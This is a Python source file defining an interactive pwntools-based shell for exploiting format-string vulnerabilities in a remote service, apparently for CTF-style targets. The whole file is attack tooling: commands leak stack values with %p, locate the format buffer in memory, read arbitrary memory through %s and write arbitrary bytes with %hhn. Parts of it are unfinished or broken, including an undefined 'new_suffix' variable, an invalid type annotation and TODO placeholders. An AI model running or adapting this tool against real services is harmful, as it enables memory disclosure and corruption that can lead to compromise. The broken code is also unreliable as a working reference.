import shell
import pwnlib
import re

from shell import Command

class NoConnectionException(Exception):
    pass

class PrintfShell(shell.Shell):
    def __init__(self, read, write, marker=b"$ ", conn=None):
        shell.Shell.__init__(self)
        self.read = read
        self.write = write
        self.conn = conn
        self.marker = marker
        # Stack Offset is the first argument index. THat is
        # printf("%{self.stack_offset}$s") will print the format string.
        self.stack_offset = None
        # This is the location of the top of the stack
        self.stack_base = None
        # format location is the memory address of the start of the format string buffer
        self.format_location = None

    @Command
    def raw(self, *args):
        print(args)
        text = b" ".join(bytes(arg, "ascii") for arg in args)
        self.conn.send(text+b"\n")
        result = self.conn.recv()
        print(result)
        return result

    @Command
    def set_offset(self, n : int):
        self.stack_offset = int(n)

    @Command
    def connect(self, address, port):
        port = int(port)
        self.conn = pwnlib.tubes.remote.remote(address, port)
        self.conn.recvuntil(self.marker)
        self.stack_base = None
        self.stack_offset = None
        print(self.conn)
    
    def read_response(self, string, marker=None):
        if marker is None:
            marker = self.marker
        string = self.write(string)
        self.conn.send(string)
        resp = self.conn.recvuntil(self.marker)
        return self.read(resp[:-len(self.marker)])
    
    @Command
    def show_stack(self, n : int):
        n = int(n)
        if not self.conn:
            raise NoConnectionException("You need to connect first")
        stack = []
        for i in range(1, n+1):
            value = self.read_response(bytes(f"%{i}$p\x00", 'ascii'))
            stack.append(value)
        print(stack)
        for index, value in enumerate(stack):
            if value == b"(nil)":
                value = b"0x0"
            _, value = value.strip().split(b"0x")
            bs = int(value, 16).to_bytes(8, byteorder="little")
            print(f"{index+1:<4} {str(value, 'ascii'):<16} {repr(bs)}")
        return stack
    
    @Command
    def disasm_at(self, addr : int, n : int):
        bs = self.read_bytes(addr, n)
        print(pwnlib.asm.disasm(bs,arch="amd64"))

    @Command
    def set_stack_base(self, addr : int):
        addr = int(addr, 16)
        top_page = (addr // 4096) * 4096 + 4096
        self.stack_base = top_page

    def pad(self, s, n, pad):
        padn = (n - len(s) % n) % n
        pad = pad*padn
        return s + pad

    @Command
    def find_memory_location(self):
        if self.stack_offset is None:
            self.stack_offset = 12 # TODO: find the actual value : find_stack_offset
        if self.stack_base is None:
            print("Need to set stack base") # TODO: guess actual value : guess stack base
            return
        watchword = pwnlib.util.packing.p64(0xdeadbeefdeadbeef)
        start = self.stack_base
        for i in range(0, 4096,8):
            command = bytes(f"%{self.stack_offset+1}$s", "ascii")
            command = self.pad(command, 8, b"\x00")
            command += pwnlib.util.packing.p64(start - i)
            command += watchword
            res = self.read_response(command)
            if res == watchword + b"\n":
                self.format_location = start - i
                print("Found stack at", hex(self.format_location))
                return
        print("Not found")
    
    @Command
    def write_byte(self, addr :int, n : value):
        addr = pwnlib.util.packing.p64(int(addr, 16))
        if n != 0:
            command = bytes(f"%{n}d%{self.stack_offset+2}$hhn\x00", "ascii")
        else:
            command = bytes(f"%{self.stack_offset+2}$hhn\x00", "ascii")
        command = self.pad(command, 16, b"\x00")
        command += addr
        self.read_response(command) # don't really need to read it beyond housecleaning

    @Command
    def read_bytes(self, addr : int, n : int):
        if self.stack_offset is None:
            print("need to set the stack offset `set_offset`")
            return
        n = int(n)
        addr = int(addr,16)
        command = bytes(f"%{self.stack_offset+1}$s", "ascii")
        padn = (8 - len(command) % 8) % 8
        pad = b"\x00"*padn
        all_bytes = b""
        offset = 0
        while len(all_bytes) < n:
            suffix = pad + pwnlib.util.packing.p64(addr + offset)
            if b"\x0a" in suffix:
                # (1) target_address (contains 0xa's)
                # JUNKJUNK # because newlines
                # address of (1)
                # format_specifier
                
                # put suffix on stack
                self.read_response("\x00"*16+new_suffix)

                # replace all bytes in suffix
                all_bytes += b"\x00"
            else:
                res = self.read_response(command + suffix)
                res = res + b"\x00"
                all_bytes += res
            offset = len(all_bytes)
        print(all_bytes)
        return all_bytes

shell = PrintfShell(read=lambda x: x, write=lambda x:x+b"\n")
shell.runloop()